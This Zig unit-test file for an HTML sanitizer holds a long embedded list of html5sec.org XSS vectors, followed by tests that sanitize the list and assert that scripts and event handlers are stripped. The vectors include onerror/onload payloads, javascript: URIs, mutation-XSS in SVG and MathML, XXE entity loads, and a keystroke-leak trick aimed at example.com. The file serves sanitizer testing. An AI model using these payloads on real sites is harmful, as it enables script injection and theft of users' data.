        \\<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'`-->]]>]</div>
        \\
        \\<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'`-->]]>]</div>
        \\
        \\<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'`-->]]>]</div>
        \\
        \\<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->
        \\
        \\<![><img src="]><img src=x onerror=alert(39)//">
        \\
        \\<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
        \\<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["'`-->]]>]</div>
        \\
        \\<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'`-->]]>]</div>
        \\
        \\<div id="41"><li style=list-style:url() onerror=alert(41)></li>
        \\
        \\<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
        \\
        \\<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'`-->]]>]</div>
        \\
        \\<div id="43"><?xml version="1.0" standalone="no"?>
        \\
        \\<html xmlns="http://www.w3.org/1999/xhtml">
        \\<head>
        \\<style type="text/css">
        \\@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
        \\</style>
        \\</head>
        \\<body>Hello</body>
        \\</html>//["'`-->]]>]</div>
        \\
        \\<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'`-->]]>]</div>
        \\
        \\<div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'`-->]]>]</div>
        \\
        \\<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'`-->]]>]</div>
        \\
        \\<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'`-->]]>]</div>
        \\
        \\<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'`-->]]>]</div>
        \\
        \\<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'`-->]]>]</div>
        \\
        \\<div id="52"><x style="behavior:url(test.sct)">//["'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>
        \\
        \\<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'`-->]]>]</div>
        \\
        \\<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'`-->]]>]</div>
        \\
        \\<div id="55"><video><source onerror="alert(55)">//["'`-->]]>]</div>
        \\
        \\<div id="56"><video onerror="alert(56)"><source></source></video>//["'`-->]]>]</div>
        \\
        \\<div id="57"><b <script>alert(57)//</script>0</script></b>//["'`-->]]>]</div>
        \\
        \\<div id="58"><b><script<b></b><alert(58)</script </b></b>//["'`-->]]>]</div>
        \\
        \\<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'`-->]]>]</div>
        \\
        \\<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'`-->]]>]</div>
        \\
        \\<div id="62"><!-- IE 6-8 -->
        \\<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
        \\<!-- IE 6-9 -->
        \\<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
        \\<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'`-->]]>]</div>
        \\
        \\<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
        \\<img src="javascript:alert(2)">
        \\<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
        \\<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'`-->]]>]</div>
        \\
        \\<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'`-->]]>]</div>
        \\
        \\<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'`-->]]>]</div><div id="66"><?xml version="1.0"?>
        \\
        \\<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
        \\<root/>//["'`-->]]>]</div>
        \\<div id="67"><!DOCTYPE x [
        \\    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
        \\ onerror CDATA "alert(67)"
        \\ onload CDATA "alert(2)">
        \\]><img />//["'`-->]]>]</div>
        \\
        \\<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
        \\    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
        \\</doc>//["'`-->]]>]</div>
        \\
        \\<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["'`-->]]>]</div>
        \\
        \\<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["'`-->]]>]</div>
        \\
        \\<div id="71"><// style=x:expression8alert(71)9>//["'`-->]]>]</div>
        \\
        \\<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["'`-->]]>]</div>
        \\
        \\<div id="73"><event-source src="event.php" onload="alert(73)">//["'`-->]]>]</div>
        \\
        \\<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["'`-->]]>]</div>
        \\
        \\<div id="75"><script<{alert(75)}/></script </>//["'`-->]]>]</div>
        \\
        \\<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["'`-->]]>]</div>
        \\
        \\<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["'`-->]]>]</div>
        \\
        \\<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["'`-->]]>]</div>
        \\
        \\<div id="79"><object allowscriptaccess="always" data="x"></object>//["'`-->]]>]</div>
        \\
        \\<div id="80"><style>*{x:ｅｘｐｒｅｓｓｉｏｎ(alert(80))}</style>//["'`-->]]>]</div>
        \\
        \\<div id="81"><x xmlns:xlink="http://www.w3.org/1999/xlink" xlink:actuate="onLoad" xlink:href="javascript:alert(81)" xlink:type="simple"/>//["'`-->]]>]</div>
        \\
        \\<div id="82"><?xml-stylesheet type="text/css" href="data:,*%7bx:expression(write(2));%7d"?>//["'`-->]]>]</div><div id="83"><x:template xmlns:x="http://www.wapforum.org/2001/wml"  x:ontimer="$(x:unesc)j$(y:escape)a$(z:noecs)v$(x)a$(y)s$(z)cript$x:alert(83)"><x:timer value="1"/></x:template>//["'`-->]]>]</div>
        \\
        \\<div id="84"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="javascript:alert(84)//#x"/>//["'`-->]]>]</div>
        \\
        \\<div id="85"><x xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load" ev:handler="test.evt#x"/>//["'`-->]]>]</div>
        \\
        \\<div id="86"><body oninput=alert(86)><input autofocus>//["'`-->]]>]</div><div id="87"><svg xmlns="http://www.w3.org/2000/svg">
        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(87)"><rect width="1000" height="1000" fill="white"/></a>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="89"><svg xmlns="http://www.w3.org/2000/svg">
        \\<set attributeName="onmouseover" to="alert(89)"/>
        \\<animate attributeName="onunload" to="alert(89)"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="90"><!-- Up to Opera 10.63 -->
        \\<div style=content:url(test2.svg)></div>
        \\
        \\<!-- Up to Opera 11.64 - see link below -->
        \\
        \\<!-- Up to Opera 12.x -->
        \\<div style="background:url(test5.svg)">PRESS ENTER</div>//["'`-->]]>]</div>
        \\
        \\<div id="91">[A]
        \\<? foo="><script>alert(91)</script>">
        \\<! foo="><script>alert(91)</script>">
        \\</ foo="><script>alert(91)</script>">
        \\[B]
        \\<? foo="><x foo='?><script>alert(91)</script>'>">
        \\[C]
        \\<! foo="[[[x]]"><x foo="]foo><script>alert(91)</script>">
        \\[D]
        \\<% foo><x foo="%><script>alert(91)</script>">//["'`-->]]>]</div>
        \\
        \\<div id="92"><div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="93"><div style="list-style:url(http://foo.f)url(javascript:alert(93));">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="94"><svg xmlns="http://www.w3.org/2000/svg">
        \\<handler xmlns:ev="http://www.w3.org/2001/xml-events" ev:event="load">alert(94)</handler>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="95"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
        \\<feImage>
        \\<set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,
        \\PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/>
        \\</feImage>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="96"><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>
        \\<iframe src=mhtml:http://html5sec.org/test.gif!xss.html></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="97"><!-- IE 5-9 -->
        \\<div id=d><x xmlns="><iframe onload=alert(97)"></div>
        \\<script>d.innerHTML+='';</script>
        \\<!-- IE 10 in IE5-9 Standards mode -->
        \\<div id=d><x xmlns='"><iframe onload=alert(2)//'></div>
        \\<script>d.innerHTML+='';</script>//["'`-->]]>]</div>
        \\
        \\<div id="98"><div id=d><div style="font-family:'sansFAAFB colorAredB'">X</div></div>
        \\<script>with(document.getElementById("d"))innerHTML=innerHTML</script>//["'`-->]]>]</div>
        \\
        \\<div id="99">XXX<style>
        \\
        \\*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */
        \\
        \\<!--
        \\--><!--*{color:red}   /* all UA */
        \\
        \\*{background:url(xx //**/
        \\ed/*)} /* IE 6-7 Standards mode */
        \\
        \\</style>//["'`-->]]>]</div>
        \\
        \\<div id="102"><img src="x` `<script>alert(102)</script>"` `>//["'`-->]]>]</div>
        \\
        \\<div id="103"><script>history.pushState(0,0,'/i/am/somewhere_else');</script>//["'`-->]]>]</div><div id="104"><svg xmlns="http://www.w3.org/2000/svg" id="foo">
        \\<x xmlns="http://www.w3.org/2001/xml-events" event="load" observer="foo" handler="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Chandler%20xml%3Aid%3D%22bar%22%20type%3D%22application%2Fecmascript%22%3E alert(104) %3C%2Fhandler%3E%0A%3C%2Fsvg%3E%0A#bar"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="105"><iframe src="data:image/svg-xml,%1F%8B%08%00%00%00%00%00%02%03%B3)N.%CA%2C(Q%A8%C8%CD%C9%2B%B6U%CA())%B0%D2%D7%2F%2F%2F%D7%2B7%D6%CB%2FJ%D77%B4%B4%B4%D4%AF%C8(%C9%CDQ%B2K%CCI-*%D10%D4%B4%D1%87%E8%B2%03"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="106"><img src onerror /" '"= alt=alert(106)//">//["'`-->]]>]</div>
        \\
        \\<div id="107"><title onpropertychange=alert(107)></title><title title=></title>//["'`-->]]>]</div>
        \\
        \\<div id="108"><!-- IE 5-8 standards mode -->
        \\<a href=http://foo.bar/#x=`y></a><img alt="`><img src=xx onerror=alert(108)></a>">
        \\<!-- IE 5-9 standards mode -->
        \\<!a foo=x=`y><img alt="`><img src=xx onerror=alert(2)//">
        \\<?a foo=x=`y><img alt="`><img src=xx onerror=alert(3)//">//["'`-->]]>]</div>
        \\
        \\<div id="109"><svg xmlns="http://www.w3.org/2000/svg">
        \\<a id="x"><rect fill="white" width="1000" height="1000"/></a>
        \\<rect  fill="white" style="clip-path:url(test3.svg#a);fill:url(#b);filter:url(#c);marker:url(#d);mask:url(#e);stroke:url(#f);"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="110"><svg xmlns="http://www.w3.org/2000/svg">
        \\<path d="M0,0" style="marker-start:url(test4.svg#a)"/>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="111"><div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div>
        \\
        \\<div id="112"><div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>//["'`-->]]>]</div><div id="113"><div id="x">XXX</div>
        \\<style>
        \\
        \\#x{font-family:foo[bar;color:green;}
        \\
        \\#y];color:red;{}
        \\
        \\</style>//["'`-->]]>]</div>
        \\
        \\<div id="114"><x style="background:url('x[a];color:red;/*')">XXX</x>//["'`-->]]>]</div><div id="115"><!--[if]><script>alert(115)</script -->
        \\<!--[if<img src=x onerror=alert(2)//]> -->//["'`-->]]>]</div>
        \\
        \\<div id="116"><div id="x">x</div>
        \\<xml:namespace prefix="t">
        \\<import namespace="t" implementation="#default#time2">
        \\<t:set attributeName="innerHTML" targetElement="x" to="<imgsrc=xonerror=alert(116)>">//["'`-->]]>]</div>
        \\
        \\<div id="117"><a href="http://attacker.org">
        \\    <iframe src="http://example.org/"></iframe>
        \\</a>//["'`-->]]>]</div>
        \\
        \\<div id="118"><div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','malicious code');">
        \\    <h1>Drop me</h1>
        \\</div>
        \\<iframe src="http://www.example.org/dropHere.html"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="119"><iframe src="view-source:http://www.example.org/" frameborder="0" style="width:400px;height:180px"></iframe>
        \\
        \\<textarea type="text" cols="50" rows="10"></textarea>//["'`-->]]>]</div>
        \\
        \\<div id="120"><script>
        \\function makePopups(){
        \\    for (i=1;i<6;i++) {
        \\        window.open('popup.html','spam'+i,'width=50,height=50');
        \\    }
        \\}
        \\</script>
        \\<body>
        \\<a href="#" onclick="makePopups()">Spam</a>//["'`-->]]>]</div>
        \\
        \\<div id="121"><html xmlns="http://www.w3.org/1999/xhtml"
        \\xmlns:svg="http://www.w3.org/2000/svg">
        \\<body style="background:gray">
        \\<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>
        \\<svg:svg>
        \\<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
        \\    <svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>
        \\    <svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>
        \\</svg:mask>
        \\</svg:svg>
        \\</body>
        \\</html>//["'`-->]]>]</div>
        \\
        \\<div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
        \\
        \\<div id="123"><span class=foo>Some text</span>
        \\<a class=bar href="http://www.example.org">www.example.org</a>
        \\<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
        \\<script>
        \\$("span.foo").click(function() {
        \\alert('foo');
        \\$("a.bar").click();
        \\});
        \\$("a.bar").click(function() {
        \\alert('bar');
        \\location="http://html5sec.org";
        \\});
        \\</script>//["'`-->]]>]</div>
        \\
        \\<div id="124"><script src="/example.comoo.js"></script> // Safari 5.0, Chrome 9, 10
        \\<script src="\example.comoo.js"></script> // Safari 5.0//["'`-->]]>]</div>
        \\
        \\<div id="125"><?xml version="1.0"?><?xml-stylesheet type="text/xml" href="#stylesheet"?><!DOCTYPE doc [<!ATTLIST xsl:stylesheet  id    ID    #REQUIRED>]><svg xmlns="http://www.w3.org/2000/svg">    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">        <xsl:template match="/">            <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(125)"></iframe>        </xsl:template>    </xsl:stylesheet>    <circle fill="red" r="40"></circle></svg>//["'`-->]]>]</div>
        \\
        \\<div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
        \\<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="alert(126)" style="behavior:url(#x);"><param name=postdomevents /></object>//["'`-->]]>]</div>
        \\
        \\<div id="127"><svg xmlns="http://www.w3.org/2000/svg" id="x">
        \\<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>
        \\<handler id="y">alert(127)</handler>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="128"><svg><style><img/src=x onerror=alert(128)// </b>//["'`-->]]>]</div>
        \\
        \\<div id="129"><svg><image style='filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.alert(129)</script></svg>")'>
        \\<!--
        \\Same effect with
        \\<image filter='...'>
        \\-->
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="130"><math href="javascript:alert(130)">CLICKME</math>
        \\<math>
        \\<!-- up to FF 13 -->
        \\<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
        \\
        \\<!-- FF 14+ -->
        \\<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
        \\</math>//["'`-->]]>]</div>
        \\
        \\<div id="132"><!doctype html>
        \\<form>
        \\<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>
        \\<br>
        \\<input name="secret" type="password">
        \\</form>
        \\<!-- injection --><svg height="50px">
        \\<image xmlns:xlink="http://www.w3.org/1999/xlink">
        \\<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />
        \\<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />
        \\<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />
        \\<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />
        \\</image>
        \\</svg>//["'`-->]]>]</div>
        \\
        \\<div id="133"><!-- `<img/src=xxx onerror=alert(133)//--!>//["'`-->]]>]</div>
        \\
        \\<div id="134"><xmp>
        \\<%
        \\</xmp>
        \\<img alt='%></xmp><img src=xx onerror=alert(134)//'>
        \\
        \\<script>
        \\x='<%'
        \\</script> %>/
        \\alert(2)
        \\</script>
        \\
        \\XXX
        \\<style>
        \\*['<!--']{}
        \\</style>
        \\-->{}
        \\*{color:red}</style>//["'`-->]]>]</div>
        \\
        \\<div id="135"><?xml-stylesheet type="text/xsl" href="#" ?>
        \\<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
        \\<template match="/">
        \\<eval>new ActiveXObject('htmlfile').parentWindow.alert(135)</eval>
        \\<if expr="new ActiveXObject('htmlfile').parentWindow.alert(2)"></if>
        \\</template>
        \\</stylesheet>//["'`-->]]>]</div>
        \\
        \\<div id="136"><form action="x" method="post">
        \\<input name="username" value="admin" />
        \\<input name="password" type="password" value="secret" />
        \\<input name="injected" value="injected" dirname="password" />
        \\<input type="submit">
        \\</form>//["'`-->]]>]</div>
        \\
        \\<div id="137"><svg>
        \\<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="?">
        \\<circle r="400"></circle>
        \\<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
        \\</a>//["'`-->]]>]</div>
        \\
        \\<input name=submit>123
        \\
        \\<input name=acceptCharset>123
        \\
        \\<form><input name=hasChildNodes>
        \\
        \\<img src="small.jpg" srcset="medium.jpg 1000w, large.jpg 2000w">
        \\
        \\<div inert></div>
        \\
        \\<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
        \\
        \\<svg></p><title><a id="</title><img src=x onerror=alert()>"></textarea></svg>
        \\
        \\<math></p><textarea><mi><style></textarea><img src=x onerror=alert(1)></mi></math>
        \\
        \\<svg></p><title><template><style></title><img src=x onerror=alert(1)>
        \\
        \\<math></br><textarea><mtext><template><style></textarea><img src=x onerror=alert(1)>
        \\
        \\<form><input name=namespaceURI>
        \\
        \\<svg></p><math><title><style><img src=x onerror=alert(1)></style></title>
        \\
        \\<svg><p><style><g title="</style><img src=x onerror=alert(1)>">
        \\
        \\<svg><foreignobject><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
        \\
        \\<math><annotation-xml encoding="text/html"><p><style><p title="</style><iframe onload&#x3d;alert(1)<!--"></style>
        \\
        \\<xmp><svg><b><style><b title='</style><img>'>
        \\
        \\<noembed><svg><b><style><b title='</style><img>'>
        \\
        \\<form><math><mtext></form><form><mglyph><style><img src=x onerror=alert(1)>
        \\
        \\<math><mtext><table><mglyph><style><math href=javascript:alert(1)>CLICKME</math>
        \\
        \\<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
        \\
        \\<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
        \\
        \\<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
        \\
        \\<math><mtext><h1><a><h6></a></h6><mglyph><svg><mtext><style><a title="</style><img src onerror='alert(1)'>"></style></h1>
        \\
        \\<!-- more soon -->
        \\
        \\a<svg><xss><desc><noscript>&lt;/noscript>&lt;/desc>&lt;s>&lt/s>&lt;style>&lt;a title="&lt;/style>&lt;img src onerror=alert(1)>">
        \\
        \\<math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src='#' onerror='alert(1)'>">
        \\
        \\
        \\<div><math></math></div>
        \\
        \\<b is="foo">bar</b>
        \\
        \\<select><template><img src=x onerror=alert(1)></template></select>
        \\
        \\<header><h1>Movie website</h1><search><form action="./search/"><label for="movie">Find a Movie</label><input type="search" id="movie" name="q" /><button type="submit">Search</button></form></search></header>
        \\
        \\<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg"><mask id="a" mask-type="alpha"><rect width="100%" height="100%" fill="rgb(10% 10% 10% / 0.4)"></rect><circle cx="50" cy="50" r="35" fill="rgb(90% 90% 90% / 0.6)"></circle></mask><rect width="45" height="45" fill="red" mask="url(#a)"></rect></svg>
    ;
    // Note: <image> elements in SVG are blocked (SSRF risk), which is stricter than DOMPurify

    const allocator = testing.allocator;
    const doc = try z.parseHTML(allocator, dirty);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;

    // Initialize CSS sanitizer for <style> tag sanitization
    var css_sanitizer = try CssSanitizer.init(allocator, .{});
    defer css_sanitizer.deinit();

    // Use custom mode with CSS sanitization enabled
    const custom_mode = SanitizerMode{
        .custom = SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = false, // ← Enable CSS sanitization instead of removal
            .sanitize_inline_styles = true,
            .strict_uri_validation = true,
            .allow_custom_elements = false,
            .allow_framework_attrs = false,
            .sanitize_dom_clobbering = true,
        },
    };

    var timer = try std.time.Timer.start();

    try sanitizeWithCss(allocator, body, custom_mode, &css_sanitizer);

    _ = timer.read();

    std.debug.print("\n=== DOMPurify Benchmark ===\n", .{});
    // std.debug.print("Input size: {} bytes\n", .{dirty.len});
    // std.debug.print("Sanitization time: {d:.2} µs ({d:.3} ms)\n", .{ elapsed_us, elapsed_ms });
    // std.debug.print("DOMPurify reference: ~11 ms\n", .{});
    // std.debug.print("Speedup: {d:.1}x faster\n", .{11.0 / elapsed_ms});

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // std.debug.print("Output size: {} bytes\n", .{result.len});

    // Write output to file for comparison
    if (std.fs.cwd().createFile("zig-output.html", .{})) |file| {
        defer file.close();
        _ = file.write(result) catch {};
    } else |_| {}

    // Check that dangerous elements were removed
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    // Note: <style> elements are now sanitized, not removed, so they should exist
    try testing.expect(std.mem.indexOf(u8, result, "<style>") != null);

    // Check that dangerous executable attributes were removed
    // Note: " onerror=" may appear as TEXT inside safe attributes like alt="..."
    // which is harmless. We check for actual dangerous patterns.
    try testing.expect(std.mem.indexOf(u8, result, "\" onclick=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "\" onerror=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "\" onload=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "' onclick=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "> onerror=") == null);

    // Verify some safe content is preserved
    try testing.expect(std.mem.indexOf(u8, result, "<svg") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<div") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<p>hello</p>") != null);
}

test "html5sec.org vectors" {
    const allocator = testing.allocator;

    // Read the html5sec.org test file
    const input = std.fs.cwd().readFileAlloc(allocator, "h5sc_sanitize_tests/h5sc-test.html", 10 * 1024 * 1024) catch |err| {
        std.debug.print("Skipping html5sec test: could not read h5sc-test.html: {}\n", .{err});
        return;
    };
    defer allocator.free(input);

    std.debug.print("\n=== HTML5 Security Cheatsheet Test (Zig) ===\n", .{});
    // std.debug.print("Input size: {} bytes\n", .{input.len});
    // std.debug.print("Total vectors: 139\n\n", .{});

    const doc = try z.parseHTML(allocator, input);
    defer z.destroyDocument(doc);

    var css_sanitizer = try CssSanitizer.init(allocator, .{});
    defer css_sanitizer.deinit();

    // var timer = try std.time.Timer.start();
    try sanitizeWithCss(allocator, z.bodyNode(doc).?, SanitizerMode.strict, &css_sanitizer);
    // const elapsed_ns = timer.read();
    // const elapsed_us = @as(f64, @floatFromInt(elapsed_ns)) / 1000.0;
    // const elapsed_ms = elapsed_us / 1000.0;

    // std.debug.print("Sanitization time: {d:.2} µs ({d:.3} ms)\n", .{ elapsed_us, elapsed_ms });

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // std.debug.print("Output size: {} bytes\n", .{result.len});

    // Write output to file for comparison with DOMPurify
    if (std.fs.cwd().createFile("/tmp/h5sc-zig-output.html", .{})) |file| {
        defer file.close();
        _ = file.write(result) catch {};
        // std.debug.print("Wrote output to /tmp/h5sc-zig-output.html\n\n", .{});
    } else |_| {}

    // Basic security checks - ensure no actual executable event handlers
    try testing.expect(std.mem.indexOf(u8, result, " onclick=") == null);
    try testing.expect(std.mem.indexOf(u8, result, " onload=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<script>alert") == null);
}
